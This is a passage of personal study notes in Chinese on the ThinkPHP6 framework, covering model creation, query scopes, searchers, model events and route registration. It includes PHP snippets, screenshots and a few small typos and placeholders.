    [&apos;name&apos;=&gt;&apos;onethink&apos;,&apos;email&apos;=&gt;&apos;onethink@qq.com&apos;]
];
$user-&gt;saveAll($list);
</code></pre><blockquote>
<p>saveAll&#x65B9;&#x6CD5;&#x65B0;&#x589E;&#x6570;&#x636E;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x5305;&#x542B;&#x65B0;&#x589E;&#x6A21;&#x578B;&#xFF08;&#x5E26;&#x81EA;&#x589E;ID&#xFF09;&#x7684;&#x6570;&#x636E;&#x96C6;&#x5BF9;&#x8C61;&#x3002;</p>
</blockquote>
<p><code>saveAll</code>&#x65B9;&#x6CD5;&#x65B0;&#x589E;&#x6570;&#x636E;&#x9ED8;&#x8BA4;&#x4F1A;&#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x6570;&#x636E;&#x662F;&#x9700;&#x8981;&#x65B0;&#x589E;&#x8FD8;&#x662F;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#xFF0C;&#x5F53;&#x6570;&#x636E;&#x4E2D;&#x5B58;&#x5728;&#x4E3B;&#x952E;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8BA4;&#x4E3A;&#x662F;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x3002;</p>
<h6 id="&#x9759;&#x6001;&#x65B9;&#x6CD5;">&#x9759;&#x6001;&#x65B9;&#x6CD5;</h6>
<p>&#x8FD8;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x9759;&#x6001;&#x8C03;&#x7528;<code>create</code>&#x65B9;&#x6CD5;&#x521B;&#x5EFA;&#x5E76;&#x5199;&#x5165;&#xFF1A;</p>
<pre><code>$user = User::create([
    &apos;name&apos;  =&gt;  &apos;thinkphp&apos;,
    &apos;email&apos; =&gt;  &apos;thinkphp@qq.com&apos;
]);
echo $user-&gt;name;
echo $user-&gt;email;
echo $user-&gt;id; // &#x83B7;&#x53D6;&#x81EA;&#x589E;ID
</code></pre><blockquote>
<p>&#x548C;<code>save</code>&#x65B9;&#x6CD5;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;<code>create</code>&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x5F53;&#x524D;&#x6A21;&#x578B;&#x7684;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x3002;</p>
</blockquote>
<p><code>create</code>&#x65B9;&#x6CD5;&#x9ED8;&#x8BA4;&#x4F1A;&#x8FC7;&#x6EE4;&#x4E0D;&#x662F;&#x6570;&#x636E;&#x8868;&#x7684;&#x5B57;&#x6BB5;&#x4FE1;&#x606F;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x4F20;&#x5165;&#x5141;&#x8BB8;&#x5199;&#x5165;&#x7684;&#x5B57;&#x6BB5;&#x5217;&#x8868;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// &#x53EA;&#x5141;&#x8BB8;&#x5199;&#x5165;name&#x548C;email&#x5B57;&#x6BB5;&#x7684;&#x6570;&#x636E;
$user = User::create([
    &apos;name&apos;  =&gt;  &apos;thinkphp&apos;,
    &apos;email&apos; =&gt;  &apos;thinkphp@qq.com&apos;
], [&apos;name&apos;, &apos;email&apos;]);
echo $user-&gt;name;
echo $user-&gt;email;
echo $user-&gt;id; // &#x83B7;&#x53D6;&#x81EA;&#x589E;ID
</code></pre><p>&#x652F;&#x6301;<code>replace</code>&#x64CD;&#x4F5C;&#xFF0C;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code>$user = User::create([
    &apos;name&apos;  =&gt;  &apos;thinkphp&apos;,
    &apos;email&apos; =&gt;  &apos;thinkphp@qq.com&apos;
], [&apos;name&apos;,&apos;email&apos;], true);
</code></pre><h4 id="&#x6A21;&#x578B;&#x521D;&#x59CB;&#x5316;">&#x6A21;&#x578B;&#x521D;&#x59CB;&#x5316;</h4>
<p>&#x6A21;&#x578B;&#x652F;&#x6301;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5B9A;&#x4E49;<code>init</code>&#x65B9;&#x6CD5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\model;

use think\Model;

class User extends Model
{
    // &#x6A21;&#x578B;&#x521D;&#x59CB;&#x5316;
    protected static function init()
    {
        //TODO:&#x521D;&#x59CB;&#x5316;&#x5185;&#x5BB9;
    }
}
</code></pre><blockquote>
<p><code>init</code>&#x5FC5;&#x987B;&#x662F;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x53EA;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#xFF0C;&#x5E76;&#x4E14;&#x53EA;&#x4F1A;&#x6267;&#x884C;&#x4E00;&#x6B21;</p>
</blockquote>
<h4 id="&#x6A21;&#x578B;&#x64CD;&#x4F5C;">&#x6A21;&#x578B;&#x64CD;&#x4F5C;</h4>
<blockquote>
<p>&#x5728;&#x6A21;&#x578B;&#x4E2D;&#x9664;&#x4E86;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x6570;&#x636E;&#x5E93;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#x4E4B;&#x5916;&#xFF08;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;<strong>&#x6570;&#x636E;&#x5E93;&#x7684;&#x6240;&#x6709;&#x67E5;&#x8BE2;&#x6784;&#x9020;&#x5668;&#x65B9;&#x6CD5;&#x6A21;&#x578B;&#x4E2D;&#x90FD;&#x53EF;&#x4EE5;&#x652F;&#x6301;</strong>&#xFF09;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x53EF;&#x4EE5;&#x628A;&#x6A21;&#x578B;&#x770B;&#x6210;&#x662F;&#x6570;&#x636E;&#x5E93;&#x7684;&#x589E;&#x5F3A;&#x7248;&#x3002;</p>
</blockquote>
<p>&#x6A21;&#x578B;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x65E0;&#x9700;&#x548C;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x4E00;&#x6837;&#x8C03;&#x7528;&#x5FC5;&#x987B;&#x9996;&#x5148;&#x8C03;&#x7528;<code>table</code>&#x6216;&#x8005;<code>name</code>&#x65B9;&#x6CD5;&#xFF0C;&#x56E0;&#x4E3A;&#x6A21;&#x578B;&#x4F1A;&#x6309;&#x7167;&#x89C4;&#x5219;&#x81EA;&#x52A8;&#x5339;&#x914D;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x8868;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;&gt;&apos;,10)-&gt;select();
</code></pre><p>&#x6539;&#x6210;&#x6A21;&#x578B;&#x64CD;&#x4F5C;&#x7684;&#x8BDD;&#x5C31;&#x53D8;&#x6210;</p>
<pre><code>User::where(&apos;id&apos;,&apos;&gt;&apos;,10)-&gt;select();
</code></pre><p>&#x867D;&#x7136;&#x770B;&#x8D77;&#x6765;&#x662F;&#x76F8;&#x540C;&#x7684;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#xFF0C;&#x4F46;&#x4E00;&#x4E2A;&#x6700;&#x660E;&#x663E;&#x7684;&#x533A;&#x522B;&#x662F;<strong>&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x7684;&#x7C7B;&#x578B;</strong>&#x4E0D;&#x540C;&#x3002;&#x7B2C;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x662F;&#x4E00;&#x4E2A;&#xFF08;&#x4E8C;&#x7EF4;&#xFF09;&#x6570;&#x7EC4;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x662F;&#x5305;&#x542B;&#x4E86;&#x6A21;&#x578B;&#xFF08;&#x96C6;&#x5408;&#xFF09;&#x7684;&#x6570;&#x636E;&#x96C6;&#x3002;&#x4E0D;&#x8FC7;&#xFF0C;&#x5728;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E8C;&#x79CD;&#x8FD4;&#x56DE;&#x7C7B;&#x578B;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x5F0F;&#x5E76;&#x65E0;&#x660E;&#x663E;&#x533A;&#x522B;&#x3002;</p>
<p>&#x6A21;&#x578B;&#x64CD;&#x4F5C;&#x548C;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x7684;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x663E;&#x8457;&#x533A;&#x522B;&#x662F;&#x6A21;&#x578B;&#x652F;&#x6301;&#x5305;&#x62EC;&#x83B7;&#x53D6;&#x5668;&#x3001;&#x4FEE;&#x6539;&#x5668;&#x3001;&#x81EA;&#x52A8;&#x65F6;&#x95F4;&#x5199;&#x5165;&#x5728;&#x5185;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x81EA;&#x52A8;&#x5316;&#x64CD;&#x4F5C;&#x548C;&#x4E8B;&#x4EF6;&#xFF0C;&#x7B80;&#x5316;&#x4E86;&#x6570;&#x636E;&#x7684;&#x5B58;&#x53D6;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x968F;&#x4E4B;&#x800C;&#x6765;&#x7684;&#x662F;&#x6027;&#x80FD;&#x6709;&#x6240;&#x4E0B;&#x964D;&#xFF08;&#x5176;&#x5B9E;&#x5E76;&#x6CA1;&#x4E0B;&#x964D;&#xFF0C;&#x800C;&#x662F;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x5904;&#x7406;&#x4E86;&#x4E00;&#x4E9B;&#x539F;&#x672C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5904;&#x7406;&#x7684;&#x64CD;&#x4F5C;&#xFF09;&#xFF0C;&#x540E;&#x9762;&#x4F1A;&#x9010;&#x6B65;&#x9886;&#x7565;&#x5230;&#x6A21;&#x578B;&#x7684;&#x8FD9;&#x4E9B;&#x7279;&#x8272;&#x529F;&#x80FD;&#x3002;</p>
<h4 id="&#x52A8;&#x6001;&#x5207;&#x6362;&#x540E;&#x7F00;">&#x52A8;&#x6001;&#x5207;&#x6362;&#x540E;&#x7F00;</h4>
<p>&#x65B0;&#x7248;&#x6A21;&#x578B;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x540E;&#x7F00;&#x5C5E;&#x6027;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x591A;&#x8BED;&#x8A00;&#x6216;&#x8005;&#x6570;&#x636E;&#x5206;&#x8868;&#x7684;&#x6A21;&#x578B;&#x67E5;&#x8BE2;&#xFF0C;&#x7701;&#x53BB;&#x4E3A;&#x591A;&#x4E2A;&#x76F8;&#x540C;&#x7ED3;&#x6784;&#x7684;&#x8868;&#x5B9A;&#x4E49;&#x591A;&#x4E2A;&#x6A21;&#x578B;&#x7684;&#x9EBB;&#x70E6;&#x3002;</p>
<p>&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x8868;&#x540E;&#x7F00;&#x53EF;&#x4EE5;&#x5728;&#x6A21;&#x578B;&#x7C7B;&#x91CC;&#x9762;&#x76F4;&#x63A5;&#x5B9A;&#x4E49;<code>suffix</code>&#x5C5E;&#x6027;&#x3002;</p>
<pre><code>&lt;?php
namespace app\model;

use think\Model;

class Blog extends Model
{
    // &#x5B9A;&#x4E49;&#x9ED8;&#x8BA4;&#x7684;&#x8868;&#x540E;&#x7F00;&#xFF08;&#x9ED8;&#x8BA4;&#x67E5;&#x8BE2;&#x4E2D;&#x6587;&#x6570;&#x636E;&#xFF09;
    protected $suffix = _cn&apos;;
}
</code></pre><blockquote>
<p>&#x4F60;&#x5728;&#x6A21;&#x578B;&#x91CC;&#x9762;&#x5B9A;&#x4E49;&#x7684;<code>name</code>&#x548C;<code>table</code>&#x5C5E;&#x6027;&#x65E0;&#x9700;&#x5305;&#x542B;&#x540E;&#x7F00;&#x5B9A;&#x4E49;</p>
</blockquote>
<p>&#x6A21;&#x578B;&#x63D0;&#x4F9B;&#x4E86;&#x52A8;&#x6001;&#x5207;&#x6362;&#x65B9;&#x6CD5;<code>suffix</code>&#x548C;<code>setSuffix</code>&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// suffix&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x9759;&#x6001;&#x67E5;&#x8BE2;
$blog = Blog::suffix(&apos;_en&apos;)-&gt;find();
$blog-&gt;name = &apos;test&apos;;
$blog-&gt;save();

// setSuffix&#x7528;&#x4E8E;&#x52A8;&#x6001;&#x8BBE;&#x7F6E;
$blog = new Blog($data);
$blog-&gt;setSuffix(&apos;_en&apos;)-&gt;save();
</code></pre><h4 id="&#x6A21;&#x578B;&#x65B9;&#x6CD5;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;">&#x6A21;&#x578B;&#x65B9;&#x6CD5;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;</h4>
<p>&#x81EA;&#x52A8;&#x7ED1;&#x5B9A;&#x81EA;&#x52A8;&#x5B9E;&#x4F8B;&#x5316;</p>
<p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x5BF9;&#x6A21;&#x578B;&#x7684;&#x65B9;&#x6CD5;&#x652F;&#x6301;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x6A21;&#x578B;&#x7684;&#x65B9;&#x6CD5;&#x6539;&#x6210;&#x95ED;&#x5305;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x5BF9;&#x83B7;&#x53D6;&#x5668;&#x65B9;&#x6CD5;&#x589E;&#x52A0;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;</p>
<pre><code>public function getTestFieldAttr($value,$data) {
    return $this-&gt;invoke(function(Request $request)  use($value,$data) {
        return $data[&apos;name&apos;] . $request-&gt;action();
    });
}
</code></pre><p>&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x83B7;&#x53D6;&#x5668;&#x65B9;&#x6CD5;&#xFF0C;&#x5728;&#x4EFB;&#x4F55;&#x9700;&#x8981;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x90FD;&#x53EF;&#x4EE5;&#x6539;&#x9020;&#x4E3A;&#x8C03;&#x7528;<code>invoke</code>&#x65B9;&#x6CD5;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;<code>invoke</code>&#x65B9;&#x6CD5;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x4F20;&#x5165;&#x9700;&#x8981;&#x8C03;&#x7528;&#x7684;&#xFF08;&#x6570;&#x7EC4;&#xFF09;&#x53C2;&#x6570;&#x3002;</p>
<p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x67D0;&#x4E2A;&#x5DF2;&#x7ECF;&#x5B9A;&#x4E49;&#x7684;&#x6A21;&#x578B;&#x65B9;&#x6CD5;&#xFF08;&#x5047;&#x8BBE;&#x5DF2;&#x7ECF;&#x4F7F;&#x7528;&#x4E86;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;&#xFF09;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>protected function bar($name, Request $request) {
    // ...
}

protected function invokeCall(){
    return $this-&gt;invoke(&apos;bar&apos;,[&apos;think&apos;]);
}
</code></pre><h4 id="&#x83B7;&#x53D6;&#x5668;&#x548C;&#x4FEE;&#x6539;&#x5668;">&#x83B7;&#x53D6;&#x5668;&#x548C;&#x4FEE;&#x6539;&#x5668;</h4>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAttr</span><span class="hljs-params">()</span>
    </span>{
        $user = UserModel::find(<span class="hljs-number">10</span>);
<span class="hljs-comment">//        return $user-&gt;username;</span>
        $user-&gt;username;
    }
</code></pre>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUsernameAttr</span><span class="hljs-params">($username)</span>
    </span>{
        <span class="hljs-keyword">echo</span> $username;
    }
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2023/02/28/420ea97d7050fbcf.png" alt=""></p>
<p>.</p>
<h4 id="&#x67E5;&#x8BE2;&#x8303;&#x56F4;">&#x67E5;&#x8BE2;&#x8303;&#x56F4;</h4>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">scopeEmail</span><span class="hljs-params">($query, $email)</span>
    </span>{
        $query-&gt;where(<span class="hljs-string">&apos;email&apos;</span>, <span class="hljs-string">&apos;like&apos;</span>, <span class="hljs-string">&apos;%&apos;</span> . $email . <span class="hljs-string">&apos;%&apos;</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">scopeScore</span><span class="hljs-params">($query, $score)</span>
    </span>{
        $query-&gt;where(<span class="hljs-string">&apos;score&apos;</span>, <span class="hljs-string">&apos;&gt;&apos;</span>, $score);
    }   
}
</code></pre>
<h5 id="&#x5168;&#x5C40;&#x67E5;&#x8BE2;&#x8303;&#x56F4;">&#x5168;&#x5C40;&#x67E5;&#x8BE2;&#x8303;&#x56F4;</h5>
<p>&#x652F;&#x6301;&#x5728;&#x6A21;&#x578B;&#x91CC;&#x9762;&#x8BBE;&#x7F6E;<code>globalScope</code>&#x5C5E;&#x6027;&#xFF0C;&#x5B9A;&#x4E49;&#x5168;&#x5C40;&#x7684;&#x67E5;&#x8BE2;&#x8303;&#x56F4;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span>
</span>{
    <span class="hljs-comment">// &#x5B9A;&#x4E49;&#x5168;&#x5C40;&#x7684;&#x67E5;&#x8BE2;&#x8303;&#x56F4;</span>
    <span class="hljs-keyword">protected</span> $globalScope = [<span class="hljs-string">&apos;status&apos;</span>];
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">scopeStatus</span><span class="hljs-params">($query)</span>
    </span>{
        $query-&gt;where(<span class="hljs-string">&apos;status&apos;</span>,<span class="hljs-number">1</span>);
    }
}
</code></pre>
<h5 id="&#x641C;&#x7D22;&#x5668;">&#x641C;&#x7D22;&#x5668;</h5>
<p>&#x641C;&#x7D22;&#x5668;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x7528;&#x4E8E;&#x5C01;&#x88C5;&#x5B57;&#x6BB5;&#xFF08;&#x6216;&#x8005;&#x641C;&#x7D22;&#x6807;&#x8BC6;&#xFF09;&#x7684;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x4E00;&#x4E2A;&#x641C;&#x7D22;&#x5668;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x65B9;&#x6CD5;&#xFF08;&#x8BE5;&#x65B9;&#x6CD5;&#x5FC5;&#x987B;&#x662F;<code>public</code>&#x7C7B;&#x578B;&#xFF09;&#xFF0C;&#x65B9;&#x6CD5;&#x547D;&#x540D;&#x89C4;&#x8303;&#x4E3A;&#xFF1A;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span> 
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">searchNameAttr</span><span class="hljs-params">($query, $value, $data)</span>
    </span>{
        $query-&gt;where(<span class="hljs-string">&apos;name&apos;</span>,<span class="hljs-string">&apos;like&apos;</span>, $value . <span class="hljs-string">&apos;%&apos;</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">searchCreateTimeAttr</span><span class="hljs-params">($query, $value, $data)</span>
    </span>{
        $query-&gt;whereBetweenTime(<span class="hljs-string">&apos;create_time&apos;</span>, $value[<span class="hljs-number">0</span>], $value[<span class="hljs-number">1</span>]);
    }    
}
</code></pre>
<h5 id="&#x81EA;&#x52A8;&#x65F6;&#x95F4;&#x6233;">&#x81EA;&#x52A8;&#x65F6;&#x95F4;&#x6233;</h5>
<p><img src="https://s3.bmp.ovh/imgs/2023/02/28/fa2afe02167ebfbc.png" alt=""></p>
<h5 id="json&#x5B57;&#x6BB5;">JSON&#x5B57;&#x6BB5;</h5>
<p>xxx</p>
<h4 id="&#x6A21;&#x578B;&#x548C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x4EF6;">&#x6A21;&#x578B;&#x548C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x4EF6;</h4>
<p>&#x521D;&#x59CB;&#x5316;</p>
<pre><code class="lang-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;456&quot;</span>;

    }
</code></pre>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initialize</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;
    }
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2023/02/28/ad50d45b2dd9015e.png" alt=""></p>
<p>.</p>
<h5 id="&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x4EF6;">&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x4EF6;</h5>
<p>&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x7684;&#x56DE;&#x8C03;&#x4E5F;&#x79F0;&#x4E3A;&#x67E5;&#x8BE2;&#x4E8B;&#x4EF6;&#xFF0C;&#x662F;&#x9488;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;CURD&#x64CD;&#x4F5C;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x56DE;&#x8C03;&#x65B9;&#x6CD5;&#xFF0C;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x4E8B;&#x4EF6;</th>
<th style="text-align:left">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">before_select</td>
<td style="text-align:left"><code>select</code>&#x67E5;&#x8BE2;&#x524D;&#x56DE;&#x8C03;</td>
</tr>
<tr>
<td style="text-align:left">before_find</td>
<td style="text-align:left"><code>find</code>&#x67E5;&#x8BE2;&#x524D;&#x56DE;&#x8C03;</td>
</tr>
<tr>
<td style="text-align:left">after_insert</td>
<td style="text-align:left"><code>insert</code>&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x540E;&#x56DE;&#x8C03;</td>
</tr>
<tr>
<td style="text-align:left">after_update</td>
<td style="text-align:left"><code>update</code>&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x540E;&#x56DE;&#x8C03;</td>
</tr>
<tr>
<td style="text-align:left">after_delete</td>
<td style="text-align:left"><code>delete</code>&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x540E;&#x56DE;&#x8C03;</td>
</tr>
</tbody>
</table>
<h3 id="&#x8DEF;&#x7531;">&#x8DEF;&#x7531;</h3>
<p>&#x8981;&#x4F7F;&#x7528;<code>Route</code>&#x7C7B;&#x6CE8;&#x518C;&#x8DEF;&#x7531;&#x5FC5;&#x987B;&#x9996;&#x5148;&#x5728;&#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;&#x5F00;&#x5934;&#x6DFB;&#x52A0;&#x5F15;&#x7528;&#xFF08;&#x540E;&#x9762;&#x4E0D;&#x518D;&#x91CD;&#x590D;&#x8BF4;&#x660E;&#xFF09;</p>
<pre><code>use think\facade\Route;
</code></pre><pre><code class="lang-http">&#x914D;&#x7F6E;&#x6587;&#x4EF6; config/route.php
&#x5B9A;&#x4E49;&#x6587;&#x4EF6; route/app.php
</code></pre>
<h5 id="&#x6CE8;&#x518C;&#x8DEF;&#x7531;">&#x6CE8;&#x518C;&#x8DEF;&#x7531;</h5>
<p>&#x6700;&#x57FA;&#x7840;&#x7684;&#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x65B9;&#x6CD5;&#x662F;&#xFF1A;</p>
<blockquote>
<p>Route::rule(&apos;&#x8DEF;&#x7531;&#x8868;&#x8FBE;&#x5F0F;&apos;, &apos;&#x8DEF;&#x7531;&#x5730;&#x5740;&apos;, &apos;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&apos;);</p>
</blockquote>
<p>&#x4F8B;&#x5982;&#x6CE8;&#x518C;&#x5982;&#x4E0B;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF08;&#x5047;&#x8BBE;&#x4E3A;&#x5355;&#x5E94;&#x7528;&#x6A21;&#x5F0F;&#xFF09;&#xFF1A;</p>
<pre><code>// &#x6CE8;&#x518C;&#x8DEF;&#x7531;&#x5230;News&#x63A7;&#x5236;&#x5668;&#x7684;read&#x64CD;&#x4F5C;
Route::rule(&apos;new/:id&apos;,&apos;News/read&apos;);
</code></pre><p><img src="https://s3.bmp.ovh/imgs/2023/01/28/c9d6533476854071.png" alt=""></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/28/d6593151db188724.png" alt=""></p>
<p>&#x6211;&#x4EEC;&#x8BBF;&#x95EE;&#xFF1A;</p>
<pre><code>http://localhost:8000/index.php/address/details/id/1.html
http://localhost:8000/index.php/address/details/id/1
http://localhost:8000/index.php/address/details?id=1
</code></pre><p>&#x4F1A;&#x81EA;&#x52A8;&#x8DEF;&#x7531;&#x5230;&#xFF1A;</p>
<pre><code>http://localhost:8000/index.php/address/details/id/1
</code></pre><p><img src="https://s3.bmp.ovh/imgs/2023/01/28/297064fe42ee9423.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/28/e7aa64dad232c2d1.png" alt=""></p>
<pre><code class="lang-http">http://localhost:8000/think
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/29/05f5762910364bf4.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/29/09066e2db85928b1.png" alt=""></p>
<h5 id="&#x95ED;&#x5305;">&#x95ED;&#x5305;</h5>
<pre><code class="lang-php">Route::get(<span class="hljs-string">&apos;think&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;hello,ThinkPHP6!&apos;</span>;
});
</code></pre>
<p><a href="https://imgse.com/i/ppi5T1I" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi5T1I.png" alt="ppi5T1I.png"></a></p>
<pre><code class="lang-php">Route::get(<span class="hljs-string">&apos;think2&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">($name)</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;hello &apos;</span>.$name;
});
<span class="hljs-comment">//http://localhost:8000/think2/name/123</span>
</code></pre>
<p><a href="https://imgse.com/i/ppi5qnf" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi5qnf.png" alt="ppi5qnf.png"></a></p>
